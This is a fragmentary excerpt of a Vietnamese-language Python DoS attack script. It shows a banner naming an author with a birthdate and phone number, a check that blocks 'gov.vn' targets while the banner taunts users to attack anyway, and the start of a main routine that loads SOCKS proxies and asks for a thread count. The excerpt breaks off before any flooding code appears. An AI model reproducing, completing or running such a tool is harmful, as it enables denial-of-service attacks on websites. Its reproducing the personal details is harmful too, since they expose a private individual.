...
print('''\r\n
Phiên Bản: 1.0
[Bạn không thể tấn công trang web chính phủ Việt Nam! thích cứ tấn công đi ko phải ngán]   
© Copyright 2021 - Giáp Đào Anh sn:28-12-2005 (Đào Anhcuto)
       !! lưu Ý đây chỉ là dos chứ ko phải ddos bạn có thể bị chặn ip !!! 
├─────────────────────────────────────────────────────┤
SĐT:0565622060
[!]Không Được Tấn Công Trang Web Của Chính Phủ::Nếu thích thì m tấn công đi ko phải ngán[!]
\r\n''')
...
def prevent():
    ...
    if 'gov.vn' in ip :
        print("Bạn không thể tấn công trang web của chính phủ Việt Nam! Protected by Nguyễn Duy Bách - (ndbiaw).")
        exit()
...
def main():
    ...
    check_socks()
    proxies = open(out_file).readlines()
    multiple = str(input("Nhập số luồng (Mặc Định=200):"))
    if multiple == "":
        multiple = int(200)
    else:
